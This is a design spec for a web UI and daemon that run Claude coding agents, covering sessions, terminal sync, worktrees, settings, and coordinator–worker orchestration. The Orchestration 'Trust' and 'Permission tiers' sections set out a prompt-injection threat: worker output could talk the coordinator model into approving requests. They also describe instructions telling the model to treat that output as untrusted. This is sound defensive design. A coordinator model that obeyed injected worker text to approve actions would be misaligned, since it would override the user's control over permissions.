# Claude Code Web UI — General Spec

Rev 9, 2026-09-30. Based on the Claude Doc spec rev 8 (https://claude.ai/artifact/QGJWx4mN966peZmokWTN1h), revised by the 2026-09-30 grilling session. This file is now ahead of the doc. Glossary: `CONTEXT.md`. Decisions: `docs/adr/`.

## Overview

A browser UI for running Claude coding agents on a machine you control. A local daemon runs sessions through the Claude Agent SDK and streams them to a web app, so you can drive and approve agent work from any browser, including a phone. It should feel like the Claude Code VS Code extension or OpenCode web: smooth, same behavior as Claude Code.

**Goals**

- Start, watch and steer agent sessions in a chosen working directory from the browser.
- Approve or deny tool use and answer Claude's questions, with the same options as Claude Code.
- Keep sessions running when the browser disconnects; catch up on reconnect with nothing lost or duplicated.
- Show tool activity readably: bash output, file-edit diffs, todo lists, subagent activity.
- Browse and edit files, rewind to checkpoints, get push notifications when input is needed.
- Private by default: no external hosting (ADR 0003), authenticated always.

**Non-goals for v1**

- Multi-user or team hosting.
- Replacing the agent loop; the SDK owns tools, context and model calls.

## Architecture

```
Browser (web app)  --WebSocket-->  Daemon  -->  Claude Agent SDK  -->  Anthropic API
                                                     |
                                     ~/.claude (transcripts, checkpoints, settings)
```

- The browser only talks to the daemon. Daemon and SDK run on the machine that holds the code.
- No database: the SDK transcript is the only store (ADR 0001).
- Auth: Claude subscription login only (ADR 0002).

**Stack**

- Daemon: Node.js + TypeScript, `@anthropic-ai/claude-agent-sdk`, `ws`.
- Web app: React + Vite, Tailwind, shadcn/ui, Vercel AI Elements (shadcn look). Layout and UX copied from OpenCode's new web UI (not its visual design).
- One shared TypeScript package for the wire protocol and message model.

## Daemon

### Sessions

- The daemon generates a UUID at `session.create` and passes it as `Options.sessionId`, so the ID is known before the first prompt. The session's CLI starts on its first prompt; before that a throwaway query lists its commands and skills.
- A live session is one long-lived `query()` in streaming input mode (required for `canUseTool`, `interrupt()`, images, `setModel()`). After a daemon restart, a session is resumed by a new `query({resume})` with the same ID.
- `settingSources: ['user', 'project']`, so CLAUDE.md, commands, skills and permission rules load like in Claude Code.
- States: `idle`, `running`, `needs_input` (permission request or question pending), `error`, `closed`. An `idle` `session_state` carries `working: true` while a background task of the own query (subagent run or background shell: `task_started` without its `task_notification`) still runs: the tab, the sidebar row and the session header show the session `running`; the prompt box stays idle (a prompt starts a turn, no Stop; Stop and Esc do not stop background tasks). The CLI answers a `task_notification` in a turn of its own: a main-chain `assistant` message while `idle` sets `running` until its `result` (also a CLI turn after a notification that came mid-turn). The daemon waits 10 s for that turn after a notification (`working` holds meanwhile), then stops counting one: a stopped or killed task may get none. A conversation rewind or plugins restart that drops the query logs the state again without `working`.
- `/clear` (also `/reset`, `/new`; plan mode exit with clear context likely too, untested: the web app offers no such option): the CLI sends `conversation_reset` and goes on in a new transcript, named by the `session_id` of its next messages (not by `new_conversation_id`; CLI 2.1.285). The daemon hands the live query to a new session with that ID (state, model, permission mode and effort carried over, saved under the new ID) and lists it; the old session keeps its history without the `/clear` prompt (a `rewind` event; its transcript records no `/clear`), is idle and resumes its own transcript on its next prompt. Background calls still running (shells, subagent runs) go on in the CLI: the new session owns them (shells list, Stop agent, their notification), the old one shows them stopped, as a restore of its transcript does. The old session logs `session_cleared`: a tab that shows it live switches to the new session in its place and keeps its prompt box (text, images, focus); the new session shows at once with an empty timeline (state chip skeleton until its subscribe reply), and a prompt sent then goes to it. While the /clear runs (until `session_cleared`) the prompt box shows "Clearing the conversation…" with a spinner: typing works, and a message sent then (Enter) is queued: its bubble shows at once and it goes to the new session as soon as the tab follows (to the same session when the /clear ends without a new one). (VS Code extension: a new conversation; the old one stays in the history). The new transcript starts with the `/clear` record, which is not shown: the new session's timeline starts empty. Until its first prompt the session list titles it "New session"; while the SDK title is `/clear` (a first prompt past the SDK's head read window, e.g. after a background task's notification turn) the list takes the first prompt from the transcript. Context usage, rewind and the changes tab then belong to the new session. A `/clear` typed in the terminal CLI writes no link from the old transcript to the new one: the mirrored session keeps its history, the new conversation is listed as a session of its own.
- Idle close: the daemon ends the CLI process (and its MCP children) of a session that is idle, has no holding subscription (no client shows it in a tab; see `session.subscribe {background}`), and had no event or hold release for 10 minutes (`CLAUDE_UI_IDLE_CLOSE_MINUTES`, `0` = never; a scan every minute, `IDLE_CLOSE_MS` in `server.ts`). Idle means: state `idle`, no pending permission request or question, no background task (subagent run, shell), no CLI turn, no rewind, no external turn, no bash command, no transcript sync. A coordinator with a starting, running or waiting worker is kept. The Session, its event log and its list entry stay; the state stays `idle` and nothing shows in the UI; the next prompt starts a CLI with `resume` and the session's model, permission mode and effort (about 4 s plus MCP start). Session-scoped grants (`destination: "session"` in `updatedPermissions`, which the CLI forgets on exit) are re-applied at each query start: `addRules` with `behavior: "allow"` as `allowedTools` (rule string escapes `\`, `(`, `)` with `\`; probed in the CLI 2.1.x bundle), `addDirectories` as `additionalDirectories`; this also covers plugins restart, conversation rewind and external-turn sync. Not freed: the in-memory event log (GH-139).
- Session list = `listSessions()` filtered to cwds inside the allowlisted roots. Includes sessions started in the terminal CLI; they can be resumed. One scan at a time; the last result is reused while no transcript file changed (each `listSessions()` call grows the daemon RSS by ~3-4 MB natively, SDK 0.3.285). The web app re-lists on a live `session_state` change, not on replayed ones.

### Terminal CLI and web app on one session

The transcript is the source of truth for external turns (turns the daemon's own `query()` did not produce). One sync step, used twice:

- Sync: read the transcript (`getSessionMessages()` plus subagent run transcripts), take the main-chain messages after the last UUID the session knows (logged from the restore or streamed by its own `query()`), convert them like a restore and log them as normal events. Runs started by the daemon's own `query()` are skipped. Synced prompts get checkpoints. A sync that logged events refreshes context usage. A compaction summary (`isCompactSummary`, terminal CLI `/compact` or auto-compact) before the preserved messages the session knows is logged too, before the new messages: the "Conversation compacted" divider, as a restore shows it.
- Read cost: stat-gated and incremental. The daemon keeps each session's parsed transcript lines and the file offset read so far; a read parses only the lines appended since (a cut last line waits, a shorter or replaced file is read again) and builds the main chain with `getSessionMessages({sessionStore})` over those lines. An unchanged file (size, mtime) reuses the last chain; a subagent run transcript is read again only when its file changed. Kept while the live mirror runs (dropped with the last subscriber, or on delete). A transcript not at the expected path (cwd longer than 200 chars) is read whole by the SDK.
- External turn running: after a sync, when the main chain's last message is not the daemon's own and leaves a turn open (a prompt, a tool result, a reply with `stop_reason` `tool_use` or none; not a local command's output or an interrupt), and the sync found new external messages, the session logs `external_turn {running: true}`; a later sync whose last message ends the turn, or 120 s without transcript growth (a CLI that died mid-turn), logs `running: false`; at the 120 s check, a live Claude Code process whose `<claude dir>/sessions/<pid>.json` names the session with `status` `busy` or `waiting` (a long tool, a terminal permission prompt) keeps the turn running for another 120 s. Meanwhile the web app shows "A terminal CLI turn is running in this session" above the prompt box and sends nothing (the prompt stays), the tab, the sidebar row and the session header show the session `running`, and `session.prompt` fails with `external_turn`.
- Fork: when the timeline's last message is no longer on the main chain (terminal CLI rewind) and the chain has new messages, a `rewind` event cuts the timeline back to the first prompt after the last common message, then the new branch follows. The main chain is the chain of the latest written leaf (`getSessionMessages()`, SDK 0.3.285).
- External turns found: the live `query()` (which misses them) is closed like for a conversation rewind; the next prompt starts a fresh one with `resume` and the session's model, permission mode and effort.
- Sync before prompt: `session.prompt` on an idle session syncs first.
- Bash mode records of the terminal CLI (`<bash-input>`, `<bash-stdout>`) render as one bash card (the persisted-output wrapper of a long output is stripped); a transcript ending in one leaves no turn open.
- Live mirror: while at least one connection is subscribed, the daemon polls the session's transcript file (stat, 1 s, like `fs.watch`); a changed size or mtime syncs. A first subscriber syncs when the file changed since the last sync or restore. Polling stops when the last subscriber leaves.
- No sync while a turn runs, a permission request or question is pending, a rewind runs, a subagent run of the own `query()` runs, or the CLI runs its own turn after a task notification. A sync asked then runs when the turn ends. An unreadable transcript logs nothing.

Rules:

| Switch | Result |
|---|---|
| Terminal CLI, then web app | Synced: the CLI's turns appear within about a second; the next web prompt continues after them. |
| Web app, then terminal CLI | Needs `claude --resume <id>`: an open terminal CLI does not re-read the transcript. |
| Both prompting at the same time | A web prompt during a terminal CLI turn is held (see "External turn running"). A terminal prompt during a web turn is not prevented (no lock): the transcript forks; the mirror shows the result after the daemon's turn ends. |

### Projects

- The project list = only the projects the user added: "Open project" (`project.open`), a session created in the web app (`session.create`), or a click, browser Back/Forward or notification click to a session of a project that is not added (`session.subscribe {addProject: true}` adds its project; a plain resubscribe after a reconnect and the hash session of a page load never do, so a removed project stays removed unless the user opens one of its sessions). Transcript-only cwds (projects used only with the terminal CLI) are not listed. Newest activity first. `session.list` returns them (`projects`) with the sessions of those projects only, so the sidebar, search and the palette's "switch session" cover added projects only. A fresh install lists none: the sidebar shows an empty state with an "Add project" action.
- `session.list` also returns `recentProjects` (`{cwd, sessionCount, lastActivity}`, newest first): cwds inside the roots with transcripts that are not added. The Open project dialog shows the first 5 above the folder browser ("Recent projects", a click or ArrowDown + Enter adds one). They show only at the dialog's start level (inside the only root, or the list of roots), not in a browsed directory. Typed text filters them by name; Tab and Enter act on the typed folder (the best matching folder is highlighted, never a recent project), a recent project is picked by click or ArrowDown + Enter.
- Added projects are kept in `projects.json` in the daemon config dir, so an added project with no sessions survives a restart. Daemons of one user (other ports) share the file: each daemon re-reads it before every list and change and writes it back through a temp file + rename, so a project added or removed on one daemon is not lost or brought back by another, and shows on the other daemon's next list. A failed write keeps the change in memory for the run (no merge until a write succeeds); an unreadable or corrupt file keeps the list in memory (so a removed project does not come back), logged once; a corrupt file at daemon start gives an empty list that counts as seeded (no upgrade seed), a missing file still seeds once. Session data stays in the transcripts (ADR 0001). Upgrade: the first `session.list` with no `seeded` mark in `projects.json` adds the cwds of sessions that have saved claude-ui settings (`sessions.json`), besides the projects already opened; transcript-only cwds stay recent. Known gap: `sessions.json` got an entry only when a session's model, mode or effort changed (now also when its first query starts), so a project known only through web-created sessions that always kept the defaults (and was never opened with "Open project") is not seeded and shows as a recent project after the upgrade; the transcript has no claude-ui marker to widen the rule with. A project removed under the old rule stays removed.
- Removing a project hides it and its sessions from the list; files and transcripts stay. It is a recent project again, and a session newer than the removal does not bring it back.
- Worktrees: for each listed project in a git repository, `session.list` returns `worktrees[projectCwd]` = `{path, branch?, main, outsideRoots?}[]` from `git worktree list --porcelain -z` (git before 2.36 has no `-z`: the newline format then; only when the project directory is one of the listed worktrees: a subfolder of a repository, e.g. `mono/pa` or a folder of a dotfiles home, is a non-git project; main worktree first; from a linked worktree too; a bare main repo and prunable entries, e.g. a deleted directory, left out; detached HEAD: `branch` = short hash; paths canonical). Run per project on every list (no cache). `sessions` also holds the sessions whose cwd is a worktree path inside the roots (exact path, as for projects), so sessions of `claude --worktree` (`<repo>/.claude/worktrees/<name>`) and Orca worktrees show without adding the worktree; such a cwd is no recent project, and `session.create` / an opened session there does not add it as a project. A worktree outside the roots is listed with `outsideRoots: true` and has no sessions (they are outside the roots). Non-git project: no entry.

### Worktrees

`worktree.create`, `worktree.status` and `worktree.remove` (code in `packages/daemon/src/git.ts`, shared with orchestration `worker_start`, GH-79). `cwd` is a project or worktree inside the roots; the repository is the one `git worktree list` reports for it. Git runs without a shell, with an option terminator before every path and ref; each git call has a 30 s timeout, the fetch 2 min (`GIT_TERMINAL_PROMPT=0`). Create and remove of one repository run one at a time (in this process). The Claude Code `WorktreeCreate` / `WorktreeRemove` hooks are not run.

- Create: `<main>/.claude/worktrees/<name>` (the folder `claude --worktree` uses) on a new branch `worktree-<name>`, created with `--no-track`. `<main>/.claude` and `.claude/worktrees` must resolve inside the repository (a symlink out is `cwd_not_allowed`), and the main checkout and the new path must be inside the roots. Name rule (Claude Code): 1 to 64 of letters, numbers, `.`, `_`, `-`; not `.`, not `.git`, no `..`; `git check-ref-format --branch` must accept the branch (`bad_name`, message = rule text). No name: `<adjective>-<noun>` (own word lists; up to 26 tries, else `exists`). A taken path or branch is `exists`.
- Base: with `worktree.baseRef` = `head` (Claude settings, local > project > user) or no `origin/HEAD`: `HEAD`. Else `origin/<default branch>` after `git fetch origin refs/heads/<default>:refs/remotes/origin/<default>`; when the fetch fails (offline) the local `origin/<default>` is used, else `HEAD`, with a warning in the daemon log.
- `worktree.symlinkDirectories` (same settings order): each entry must be relative, without `..`, existing, and resolve inside the repository; it becomes a symlink in the new worktree (junction on Windows). Other entries are skipped with a warning; creation still succeeds.
- The branch is created first (`git branch --no-track`, which fails atomically with `exists` when the name is taken, so a branch a user made meanwhile is never touched), then `git worktree add` checks it out. A failed add deletes only the branch this call created, (git refuses to delete a branch a worktree has checked out). A caller step after the add (`worker_start`'s session) that fails removes the new worktree and branch.
- `/.claude/worktrees/` is appended once to `<git-common-dir>/info/exclude` (local, never committed) so `git add -A` in the main checkout does not add worktrees as embedded repositories.
- Status: `{uncommitted, commits, branch}`: changed and untracked files (ignored not); commits that only this worktree's branch holds (`worktree-*` branch or detached HEAD; other branches: 0).
- Remove: only a linked worktree that sits directly in `<main>/.claude/worktrees` (no symlink in between) and inside the roots. A worktree made by hand or by another tool (e.g. `../repo-wt/x`, Orca) is `not_removable`: the web app shows no Trash button and the daemon refuses it. Also refused: the main worktree and unknown paths (`not_worktree`), and a worktree with a running or needs-input session (`has_sessions_running`). Idle live sessions there are closed (transcripts stay, ADR 0001); other clients close their tabs through `sessions.changed`. While a removal runs, `session.create` and `terminal.create` in that worktree return `worktree_removing`. Then `git worktree remove --force`, `git branch -D` only for a `worktree-*` branch (any other branch stays), `git worktree prune`.
- Error codes: `bad_cwd`, `cwd_not_allowed` (cwd, path, repository or new path outside the roots, or `.claude` or `.claude/worktrees` is a link), `not_git` (also a repository with a separate git dir or a submodule: its main worktree has no `.git` entry), `bad_name`, `bad_base` (explicit base, GH-79), `exists`, `not_worktree`, `not_removable`, `has_sessions_running`, `worktree_removing`, `git_failed` (first stderr line, or "git <cmd> timed out").

### Settings

- App-wide, daemon-side settings are kept in `settings.json` in the daemon config dir (mode 0600), through the shared JSON-file helper of "Projects": daemons of one user (other ports) share the file, each re-reads it before every read and change, a corrupt or unreadable file is logged once and gives the defaults. Per-browser choices (Push and in-app notifications, theme) stay in the browser, not here.
- Shape `{ orchestration: { enabled, workerCap, coordinatorPermissions, workerMode }, usageLimit: { autoContinue }, notifications: { desktop } }`; defaults `false`, `4`, `false` (the user opts in to coordinator permission answers), `"coordinator"`, `false`, and `true` (desktop notifications on). `workerMode` is one of `coordinator`, `default`, `acceptEdits`, `plan`, `auto`: the mode of a `worker_start` without `mode`; `coordinator` keeps the coordinator's own mode (bypass gives auto). The setting is not the user's approval: a mode above the coordinator's still needs the `worker_start` card, whose title and fixed input show the setting's mode. `settings.json` keeps only valid known fields that differ from their default: a field the user never changed follows a later default change, a field set back to its default is removed, and unknown keys are dropped on the next write. The key was `coordinatorAnswersPermissions` while it had no effect and defaulted to `true`; that old key is ignored, so an install that saved it without choosing reads as off. `workerCap` is an integer 1 to 20. A stored field that is missing or invalid falls back to its default on its own, so a hand-edited file keeps its valid fields. A new setting is one field in the protocol `Settings` type and in the daemon's `DEFAULTS` and `CHECKS`, one row in the dialog's `SECTIONS`.
- Wire: `settings.get` replies `{settings, daemon?}` (`daemon: {host, version?, desktopForcedOff?}`: the computer's name, the daemon's claude-code-ui version (`"dev"` for a source checkout; omitted by an older daemon), and `true` when started with `--no-os-notify`; additive, an older daemon omits it); `settings.set {patch}` sets only the fields in `patch` (another daemon's change to other fields stays), replies `{settings, daemon?}`, and broadcasts `settings_changed {settings}` to every client of this daemon; an unknown field or an invalid value gives error `bad_settings`. Readers call the store's `get()` each time, so a change applies without a restart; a running coordinator keeps its tools until its query restarts. Another daemon's change shows on the next `get()`, no file watching.
- Web: a "Settings" button at the bottom of the sidebar (and drawer), the palette command "Open settings" and Ctrl/Cmd+, open the Settings dialog (the config dialog shell, full-height below `sm`). The dialog has two panes: on the left a list of groups (`role="tablist"`, vertical; Timeline, Notifications, Changes, Sidebar, Tabs, Keyboard, Guide, Usage limits, Orchestration, About, in that order; Tabs, Keyboard and Guide only when App offers them), on the right the settings of the selected group (`role="tabpanel"`). ArrowUp/ArrowDown, Home and End move through the groups (roving tabindex, the panel follows); Esc closes the dialog. The selected group is kept per browser (`localStorage["claude-ui.settingsGroup"]`; an unknown id falls back to the first) and every way of opening Settings shows it. Below `md` the list comes first and picking a group drills into its settings with a "Settings" Back button (44 px targets; the focus returns to the group in the list); the list shows again each time the dialog opens. A later group is one more entry in the dialog's `groups`. Group "Notifications": "In-app notifications" switch (per browser, on by default; see "In-app notifications" in the session view UX), "Push notifications" switch (this browser's Web Push subscription, moved here from the sidebar checkbox; unsupported without HTTPS or localhost: `aria-disabled` with the reason; a permission or subscribe error shows as an alert under the row) and "Desktop notifications on <host>" (daemon-side `notifications.desktop`, default on: the daemon's computer shows a system notification while no browser has push on; `aria-disabled` with "Turned off when the daemon started (--no-os-notify or CLAUDE_UI_OS_NOTIFY=0)." when the flag was given; for every browser of the daemon). Group "Timeline" (per browser, not in `settings.json`): "Signal only" switch (see "Session view UX"), with the live key of `signal.toggle` next to its label (it follows a rebinding and disappears when unbound); hint "Folds each run of tool calls into one line ... in every session. ... Kept in this browser." Group "Changes" (per browser, not in `settings.json`): "Default diff view" select (Session changes / Uncommitted / Against branch), the mode a session's Changes panel opens in. Group "Sidebar" (per browser, not in `settings.json`): "Layout" select (Default / Classic, `claude-ui.sidebarView`.`layout`), "Show only active sessions", the sidebar options menu's "Only active sessions" (`claude-ui.sidebarView`), off by default; hint "Lists sessions that are running or need input. Search still finds every session, and the one you have open stays listed. Kept in this browser." Group "Tabs" (per browser, not in `settings.json`, shown even while the daemon settings load or fail): "Tab grouping" select (By project / By worktree / None), applies at once. Group "Keyboard" (per browser): "Keyboard shortcuts" with a "Customize…" button that opens the Keyboard shortcuts dialog ("Keyboard shortcuts"). Group "Guide" (per browser, same): "Guided tour" with a "Restart guide" button that closes Settings and starts the tour (see "First-use guide"). Group "Usage limits": one switch, "Continue automatically after a usage limit resets" (see "Continue after a usage limit"; its hint says a daemon restart drops scheduled continues) and, per browser, a "Usage ring shows" select (Highest usage / Session (5 h) / Weekly; see "Plan usage" in the protocol notes). Group "About" (always last, no request of its own): "Web app" (the claude-code-ui version the bundle was built from, vite `define` `__APP_VERSION__` read from `packages/claude-ui/package.json`, `dev` where undefined, e.g. in tests) and "Daemon" (`settings.get` `daemon.version`, hidden while unknown) as selectable text for bug reports. Group "Orchestration" (switch, number field, "Worker mode" select, switch; committed on click, Enter or blur; the daemon's error shows in a banner). `orchestration.enabled` and `workerCap` apply in the daemon ("Orchestration"); `coordinatorPermissions` gates `worker_permission` ("Permission tiers"). Its hint says what it allows: approving or denying, once, reads and file edits inside the worker folder, reads of the repository's main checkout and agent docs, and read-only git commands (status, log, diff, show); other commands and everything else wait for the user; edits can change code that commands the user approves later will run.

### Orchestration

Optional (Settings `orchestration.enabled`, off by default). A **coordinator** session drives **worker** sessions through the daemon; a worker is a normal session in every other way (web app, Needs input, push notifications).

- Coordinator: no special start. While orchestration is on, every session that is not a worker gets the tools (below), and the one that starts a worker becomes its coordinator; `role: "coordinator"` entries in older `sessions.json` files are ignored. Its permission mode works as for any session (the cwd's default, every mode the daemon offers, restored from its saved settings). In `auto`, `dontAsk` and `bypassPermissions` the CLI decides its tool calls, `worker_start` included, without asking the user: the user chooses that by picking the mode. Each query start of a session that is not a worker (first prompt, resume, restart) gets the in-process SDK MCP server `orchestration` (`createSdkMcpServer`) in `mcpServers`, only while orchestration is on: turning it off keeps a running session's tools until its query restarts; turning it on reaches a running session at its next query start. A worker never gets the server: no worker of a worker.
- Worker: started by `worker_start`; its `sessions.json` entry gets `{coordinatorId, name, cwd, port}` next to its model, mode and effort (a link written before the first query start does not stop that start from saving the settings). Coordinator and workers live on one daemon: a tool call on a worker without a live query in this daemon, whose link names another port, and that a live CLI process runs (`<claudeDir>/sessions/<pid>.json`, written by SDK-spawned CLIs too) is a tool error; otherwise this daemon takes the worker over and rewrites `port` (e.g. after a restart on another port).
- Tools (inputs checked by the daemon with zod in each handler, not only by the SDK; a refused input or call is a tool error result, `isError`):

| Tool | Does |
|---|---|
| `worker_start {name, cwd \| repo + branch + base?, prompt, model?, mode?, effort?}` | New session in `cwd`, then `prompt` as its first turn. `name` `[a-z0-9-]{1,40}`, unique per coordinator. `cwd` must be an existing directory inside the daemon's roots (same check as `session.create`). `mode`: absent = Settings `workerMode` unless that is `coordinator`, else the coordinator's current permission mode, `bypassPermissions` gives `auto` (`dontAsk` stays `dontAsk`); a `mode` of the tool wins over the setting; or `default`, `acceptEdits`, `plan`, `auto`; never `dontAsk` or `bypassPermissions` from the tool. `auto` on a model without `supportsAutoMode` runs in `default` and the reply adds `modeNote`. `model` given as a full model ID (`resolvedModel`) is stored as its models.list `value`; a model that is neither is a tool error listing the valid values (when the list is loaded). Claude settings `permissions.defaultMode` does not apply. Its project is added. Or, with `repo` (an added project inside the roots) and `branch`: a new worktree `<main>/.claude/worktrees/<branch>` on new branch `<branch>` from `base` (absent: the "Worktrees" default) through the "Worktrees" create code, and the session starts there; `branch` follows the worktree name rule, no leading `-`, `check-ref-format --branch`; `base` no leading `-`, must be a commit. An existing branch or folder, a bad `base`, a `repo` that is no project: tool error, nothing created. The worktree is created only after the user approved the call; the cap and name checks come first. If the session or link cannot be made, the worktree and branch are removed. The worktree is not added as a project (its sessions show under the repository's project). `worker_close` keeps it; Remove in the web app removes it. Reply: `{name, sessionId, cwd, mode, modeNote?, branch?, daemonNote?}` (`modeNote` also names Settings > Worker mode when that is `auto` on a model without auto; `daemonNote`: see "Updates"). |
| `worker_send {name, text}` | As `session.prompt`: Steering while the worker's turn runs, else a new turn. A worker without a CLI process (closed, restored) needs a free place under the cap. |
| `worker_answer {name, id, answer}` | Answers the worker's pending question `id`: `answer` text (one-question asks) or `{question text: answer}`. First answer wins: the user's later answer gets `settled: false`, and the coordinator's after the user's is a tool error. Settles with `by: "coordinator"`; refused (tool error) on an escalated question. |
| `worker_permission {name, id, allow, reason}` | Settles the worker's pending Permission request `id` when its Permission tier is `low` ("Permission tiers"): allow once or deny, `reason` 1 to 1000 characters. Tool error, request still pending for the user: setting "Coordinator may answer permission requests" off (checked first), unknown, settled or question ID, another worker's request, escalated, `high` tier, or answered meanwhile (first answer wins with the user). Returns `{name, id, decision}`. |
| `worker_escalate {name, id, reason}` | Hands the worker's pending question or Permission request `id` to the user: the part is re-emitted with `escalated: true` and `reason` (at most 1000 characters), a push notification goes out at once (past the 5 s gap; only a focused tab of the worker suppresses it, not the coordinator's), the worker stays Needs input. From then on `worker_wait` does not return it and `worker_answer` and `worker_permission` are tool errors; `worker_stop` and `worker_close` still cancel it (the user's card closes, its notification is replaced); otherwise the user answers in the web app. Unknown, settled or already escalated ID: tool error. |
| `worker_wait {names?, types?, timeoutMs?}` | Returns the coordinator's unread worker events, or blocks until one arrives or `timeoutMs` (default 5 min, at most 30 min) passes: then `{events: []}`, no error. Types `question` (with `requestId`, questions and option labels), `permission` (a pending Permission request with `requestId`, `tool`, `input`, `tier` and `mayAnswer` (`low` tier and the setting on: the coordinator may answer it with `worker_permission`; false: the user only, hand it over with `worker_escalate`)), `denied` (a worker tool call whose status became `denied` without the coordinator: the auto-mode classifier, a rule, the user, an interrupt; `toolUseId`, `tool`, `input`), `turn_end` (`result`: the worker's last reply text of the turn, `isError`, or `interrupted`), `error` (session failed). A question or permission request already settled or escalated is dropped. Cancelled with the tool call (interrupt). |
| `worker_list` | `{workers, daemonNote?}`: name, session ID, cwd, state (`running`, `idle`, `needs_input`, `error`, `closed`, `not_loaded` after a restart), `live` (its CLI process runs), last activity in this daemon run. |
| `worker_read {name, lastN?}` | The last `lastN` (default 20, at most 200) main-thread timeline entries as text: prompts, replies, tool calls (name, status, input cut to 300 characters), questions, permission requests, turn ends. Each text cut at 4000 characters, the whole result at 20 000 (oldest entries dropped first). |
| `worker_stop {name}` | `session.interrupt` of the worker: pending questions and Permission requests are cancelled, escalated ones too; waits up to 10 s until the worker is no longer running or waiting; replies `{name, state}`. |
| `worker_close {name}` | Drops the worker's CLI process like the Plugins "Restart" (session and transcript stay; `worker_send` resumes it). A running or waiting worker is stopped first as by `worker_stop` (tool error when it has not stopped within 10 s). An idle worker no tab shows is closed the same way after the idle time ("Idle close"); a coordinator with a starting, running or waiting worker is not. |

- Permission: in a mode that asks (`default`, `acceptEdits`, `plan`), `worker_start` is a Permission request on the coordinator (the user sees name, cwd, prompt and mode) without the SDK's "don't ask again" suggestions, so no Permission rule can skip it later (a rule written by hand skips the card, so the handler refuses a worker above the coordinator's mode that did not come through a card: tool error "a worker above the coordinator's mode needs the user's worker_start card; remove the allow rule or start it in <mode>"; ranking dontAsk < plan = default < acceptEdits < auto). The card's title says `Start worker <name> in <mode> mode` (with the fallback note), or `Start worker <name>: unknown model <m>, the call will fail` when the model list is loaded and has no such model, and the daemon writes the inherited mode into the request's input, so the worker gets the mode the user approved even if the coordinator's mode changes before the answer. In `auto` / `bypassPermissions` the CLI decides `worker_start` without a card; the worker then gets at most `auto`. The other tools (`worker_escalate` and `worker_permission` included; `worker_permission` can only settle `low` requests) run without one: `canUseTool` allows `mcp__orchestration__<tool>` when the SDK's `mcpServer` is `{name: "orchestration", source: "sdk"}` (only the host registers an `sdk` server; a configured server named `orchestration` has another source). Verified with SDK 0.3.285 (`development-docs/GH-79/1-probe-mcp.log`): SDK MCP tools reach `canUseTool` with their full name and `mcpServer.source: "sdk"`, with a "don't ask again" suggestion; the SDK's own schema check runs after `canUseTool`. In `dontAsk` mode a coordinator gets no tool without a Permission rule; in `bypassPermissions` / `auto` the CLI decides without `canUseTool`, as for any tool.
- Question routing: a worker question is pending for the coordinator and the user at once; the first answer wins. The MCP server's `instructions` (the coordinator's prompt append; after starting or messaging workers the coordinator ends its turn and waits for the notice, with no `worker_wait` loop; `INSTRUCTIONS` in `orchestration.ts`, snapshot-tested) and the `worker_answer` / `worker_escalate` descriptions split two classes. Mechanical: the answer is a fact the coordinator can check (code, spec, ticket, ledger: a path, a command, an existing helper, a naming convention, a test file); it answers with `worker_answer`. Blocking: scope, acceptance criteria, user-visible behaviour, a design trade-off, a destructive or external action, or unsure; it hands them over with `worker_escalate`. The split is model judgment, not enforced by the daemon. Attribution: `by: "coordinator"` is set only by the daemon on a coordinator's `worker_answer`; a client message (`question.respond`) cannot set it. A worker question still pushes "Needs input" to the user at once, mechanical ones too. Attribution and escalation live in the daemon's event log only: after a daemon restart the transcript restore has no `question` part (only the `AskUserQuestion` tool card), so no "Answered by coordinator" shows then.
- Worker cap: `workerCap` counts the daemon's workers that have a CLI process (started, not closed by `worker_close`, not ended); a `worker_start` (or a `worker_send` that would start a process) at the cap is a tool error naming the cap. A worker counts from its cap check on: `worker_start` (checks, link write, mark) and `worker_send` to a worker without a process (check, mark) have no await between check and mark, so parallel calls cannot pass the cap or reuse a name; the mark ends once the prompt is taken. A `worker_start` with `repo` holds its name and a place under the cap from its checks until its link is written (the worktree is created in between). A user's prompt in the web app is not capped.
- Delivery: the daemon follows each tracked session's live events; a worker's `turn_result` / `turn_interrupted`, pending `question`, pending `permission_request` and `session_state error` become an event of its coordinator. A blocked `worker_wait` that matches takes it; otherwise it is queued (200 per coordinator, oldest dropped) and the coordinator gets one notice per batch (until its next `worker_wait`), sent like `session.prompt`: Steering while its turn runs, a new turn when idle. The notice text names the worker and the event type only (`[claude-ui orchestration notice] Worker a: turn end. Call worker_wait to read the events.`): it arrives as a user message, so no worker text rides on it. No notice (the queue waits) to a coordinator not live in this daemon run, while orchestration is off, or while its live query was started without the server; a notice that could not be sent lets the next event try again.
- Trust: everything a worker produces (result text, questions, permission inputs, `worker_read`) is untrusted input to the coordinator model; the server's MCP instructions and the tool descriptions say so. The coordinator gets no authority the user did not grant: no new roots, a worker's mode above the coordinator's only through the user's `worker_start` card, never `bypassPermissions`, worker Permission requests reach the coordinator only through the Permission tiers below, and only while the user turned "Coordinator may answer permission requests" on.
- Restart: links and transcripts survive; running turns stop as for any session. `worker_list` shows the workers from `sessions.json` (state `not_loaded` until a call restores one). When the daemon's HTTP server closes, a blocked `worker_wait` ends with a tool error; when the process is killed the coordinator's CLI dies with it and its pending call shows stopped. Queued events are lost.
- List and sidebar: `session.list` items carry `coordinator` (the session has a worker), `coordinatorId` and `workerName` from `sessions.json` (the same after a restart); a worker of a listed coordinator is listed also when its project is not added; `worker_start` broadcasts `sessions.changed` after the link is written. Web app: no Coordinator toggle; a coordinator offers the same modes as any session. The notice user message (`[claude-ui orchestration notice] ...`) shows as a muted chip without the prefix, no bubble and no Copy/Rewind.

#### Permission tiers

The daemon assigns every worker Permission request a **Permission tier**, `low` or `high` (`risk-tier.ts`, `tier(tool, input, {cwd, blockedPath, defaultToNo, requiresUserInteraction})`). A coordinator may settle `low` only. The tier is the only security boundary between the coordinator model and a worker's Permission request: worker output (results, transcripts, files and web pages a worker read) is untrusted input that can talk the coordinator into approving anything it is allowed to approve, so the mechanical/blocking advice in the instructions is advisory, the tier is not. Anything not listed below is `high`; any error (a missing cwd, a bad input shape) is `high`.

Request-level `high` first: the SDK sent `blockedPath`, `defaultToNo: true` or `requiresUserInteraction: true`; the tool name starts with `mcp__` (every MCP tool; workers get no `sdk` server).

| Tool | `low` when |
|---|---|
| `Read`, `NotebookRead`, `LS` | the path passes the read path check |
| `Bash` | a read-only git command (below), in a worker whose CLI runs with `CLAUDE_BASH_MAINTAIN_PROJECT_WORKING_DIR=1`; `status`, `log`, `diff`, `show` only in a plain repository |
| `Glob` | `path` absent or passes the path check; `pattern` present, not absolute, no `..` segment, no leading `~` |
| `Grep` | `path` present and passes the path check, not the cwd itself (a search of every file may read `.env`); `glob` (if any) as the Glob pattern and no segment on the deny list |
| `TodoWrite`, `WebSearch` | always (no file or process side effect; WebSearch is a server-side read-only tool) |
